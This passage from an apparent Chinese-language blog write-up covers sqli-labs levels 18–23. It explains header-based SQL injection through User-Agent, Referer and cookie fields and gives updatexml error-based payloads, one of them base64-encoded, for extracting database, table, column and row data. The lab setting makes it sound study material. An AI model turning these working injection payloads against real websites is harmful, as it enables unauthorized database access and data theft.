0,1),0x7e),1)--+\n\nLess-18进入网站就显示了ip，网页记录了ip、浏览器信息以及其他信息就可能是头注入\n请求头\nUser-Agent\t\t浏览器的身份标识字符串\nReferer\t\t\t表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏\t\t\t\t\t览器带到了当前页面。\nAccept\t\t\t可接受的响应内容类型（Content-Types）。\nX-Forwarded-For\t可以用来表示HTTP请求端真实IP\nDate\t\t\t发送该消息的日期和时间（以RFC 7231中定义的\"HTTP日期\"格式来发\t\t\t\t 送）\n\n\n$insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n注入点为uagent即User-Agent\n\n必须要登录成功才会记录IP，弱口令\nuname=admin&amp;passwd=admin\n\n\n判断库名:\n'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #\n\n$insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #', '$IP', $uname)\";\n后面的1,1)为了补齐后面'$IP', $uname两个字段\n\n判断表名:\n'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1),1,1)-- #\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1),1,1)-- qwe\n\n判断数据:\n'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1),1,1)-- qwe\n\nLess-19注入点与18不同，其他类18\n注入点变为referer\n\n$insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\";\n\nLess-20登录之后会显示很多个人信息，特别是提示cookie\n\n诸如点是cookie\n$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\n\n判断库名:\n'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\n判断表名:\n'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe\n\n判断数据:\n'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe\n\nLess-21Cookie被base64编码，把payload用base64编码再发包\n\n判断库名:\nadmin 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1\nYWRtaW4gJ2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoU0VMRUNUIGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=\n\n判断表名:\nadmin 'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1) and '1'='1\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1) and '1'='1\n\n判断数据:\nand updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)and '1'='1\n\nLess-22Less-23\n","slug":"SQLI-LABS","date":"2022-09-28T18:49:24.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Yum1"}]